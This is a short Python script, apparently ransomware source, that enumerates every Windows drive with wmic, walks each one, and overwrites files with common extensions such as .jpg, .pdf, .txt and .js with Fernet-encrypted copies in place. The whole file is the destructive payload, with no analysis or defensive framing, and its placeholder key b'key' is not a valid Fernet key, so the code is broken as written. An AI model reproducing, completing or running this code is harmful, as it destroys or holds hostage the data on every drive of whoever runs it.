from cryptography.fernet import Fernet
from subprocess import check_output
import os

drives = ["A:", "B:", "C:", "D:", "F:", "G:", "H:", "Z:", "N:", "K:", "L:", "X:", "P:", "U:", "J:", "S:", "R:",
          "W:", "Q:", "T:", "Y:", "I:", "O:", "V:", "M:", "E:"]
formats = [".jpg", ".pdf", ".mp3", ".rar", ".mp4", ".txt", ".html", ".js", ".php", ".png"]


def find_drives() -> list:
    """ find drives """
    valid_drive = []
    CMD_output = check_output("wmic logicaldisk get name", shell=True)
    for drive in drives:
        if drive in CMD_output.decode("UTF-8"):
            valid_drive.append(drive)
    print(valid_drive)
    return valid_drive


def encrypt_files():
    # paths_file = open("paths.txt", "w") # if you want save paths in file
    Encrypt = Fernet(b'key')
    valid_drives = find_drives()
    a = input()
    for drive in valid_drives:  # find files
        for r, d, f in os.walk(drive + "\\"):
            for file in f:
                for one_format in formats:
                    if file.endswith(one_format):
                        try:
                            files = open(os.path.join(r, file), "r+b")
                            # paths_file.writelines(os.path.join(r, file + "\n")) # add paths in line
                            data = files.read()
                            files.seek(0)
                            files.truncate()
                            new_data = Encrypt.encrypt(data)
                            files.write(new_data)
                            files.close()

                        except Exception as error:
                            print(error)
                            continue
    # paths_file.close()


if __name__ == "__main__":
    encrypt_files()
